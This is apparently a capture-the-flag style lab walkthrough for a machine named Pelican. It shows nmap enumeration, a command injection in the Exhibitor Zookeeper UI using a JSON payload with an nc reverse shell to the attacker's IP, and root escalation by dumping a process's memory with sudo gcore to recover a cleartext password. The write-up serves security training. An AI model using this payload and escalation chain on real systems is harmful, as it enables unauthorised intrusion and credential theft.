_____

# Exploitation Guide for Pelican

We'll gain an initial foothold on this target through an unauthenticated command injection vulnerability. We'll then gain root access by leveraging `sudo` into a password disclosure.

## Enumeration

Let's begin with an `nmap` scan against all TCP ports.

```
kali@kali:~$ nmap 192.168.120.233 -p-

Host is up (0.021s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
631/tcp   open  ipp
2181/tcp  open  eforward
2222/tcp  open  EtherNetIP-1
8080/tcp  open  http-proxy
8081/tcp  open  blackice-icecap
44505/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 126.16 seconds
```

An `nmap -A` scan against the identified services reveals a few points of interest. Specifically, we identify an _Apache Zookeeper_ service running on port 2181, and a redirect from port 8081 pointing to an _Exhibitor for Zookeeper UI_ on port 8080.

```
PORT      STATE  SERVICE     VERSION
...
2181/tcp  open   zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
...
8081/tcp  open   http        nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://192.168.120.233:8080/exhibitor/v1/ui/index.html
...
```

After confirming the findings by browsing the applications, we search Google and discover [an unauthenticated command injection vulnerability](https://talosintelligence.com/vulnerability_reports/TALOS-2019-0790) in the Exhibitor UI.

## Exploitation

### Unauthenticated Command Injection in Exhibitor UI

According to the vulnerability disclosure, we can obtain an initial shell with a single `curl` command along with a **data.json** file which contains our payload. This payload should include a reverse shell command within the vulnerable `javaEnvironment` name value, and we must use the correct values for `serverId` and `serverSpec`, both of which we can obtain from the UI.

**data.json**:

```json
{ "zookeeperInstallDirectory": "/opt/zookeeper", "zookeeperDataDirectory": "/zookeeper/data", "zookeeperLogDirectory": "/opt/zookeeper/transactions", "logIndexDirectory": "/opt/zookeeper/transactions", "autoManageInstancesSettlingPeriodMs": "0", "autoManageInstancesFixedEnsembleSize": "0", "autoManageInstancesApplyAllAtOnce": "1", "observerThreshold": "0", "serversSpec": "1:pelican", "javaEnvironment": "$(/bin/nc -e /bin/sh 192.168.118.11 8080 &)", "log4jProperties": "", "clientPort": "2181", "connectPort": "2888", "electionPort": "3888", "checkMs": "30000", "cleanupPeriodMs": "300000", "cleanupMaxFiles": "20", "backupPeriodMs": "600000", "backupMaxStoreMs": "21600000", "autoManageInstances": "1", "zooCfgExtra": { "tickTime": "2000", "initLimit": "10", "syncLimit": "5", "quorumListenOnAllIPs": "true" }, "backupExtra": { "directory": "" }, "serverId": 2 }
```

Next, we'll launch a netcat listener on port `8080`.

```
kali@kali:~$ nc -nlvp 8080
listening on [any] 8080 ...
```

Once we've determined our data payload is correct, the following `curl` command should give us our initial shell:

```
kali@kali:~$ curl -X POST -d @data.json http://192.168.120.233:8080/exhibitor/v1/config/set
```

After several seconds, we catch our low privileged shell as `charles`.

```
kali@kali:~$ sudo nc -nlvp 8080
listening on [any] 8080 ...
connect to [192.168.118.11] from (UNKNOWN) [192.168.120.233] 36484
id
uid=1000(charles) gid=1000(charles) groups=1000(charles)

python -c 'import pty; pty.spawn("/bin/bash");'
```

## Escalation

We begin our escalation process with `sudo -l`, seeking programs that allow `sudo` as `root`. This reveals that our current user can run **/usr/bin/gcore** with sudo.

```
charles@pelican:/opt/zookeeper$ sudo -l

Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
...
```

Next, we'll hunt for processes that might be of interest with `ps auxwww` and subsequently identify an interesting **/usr/bin/password-store** process running as the `root` user:

```
...
root       492  0.0  0.0   2276    76 ?        Ss   18:53   0:00 /usr/bin/password-store
charles    526  0.6  5.6 2568196 116060 ?      Ssl  18:53   0:08 /usr/bin/java -jar /opt/exhibitor/exhibitor-1.0-jar-with-dependencies.jar -c file
...
```

Let's attempt to dump the `password-store` process memory to a core file by specifying its PID (`492` in this case) with the `gcore` command.

```
charles@pelican:/opt/zookeeper$ sudo /usr/bin/gcore 492
...
Saved corefile core.492
[Inferior 1 (process 492) detached]
```

Running `strings` against the generated core file, we discover cleartext credentials for the `root` user that were stored in the memory of the `password-store` process:

```
charles@pelican:/opt/zookeeper$ strings core.492

...
/usr/bin/passwor
////////////////
001 Password: root:
ClogKingpinInning731
x86_64
/usr/bin/password-store
```

Now, we can easily escalate to `root` with the `su root` command:

```
charles@pelican:/opt/zookeeper$ su root

Password:

root@pelican:/opt/zookeeper# id
id
uid=0(root) gid=0(root) groups=0(root)
```
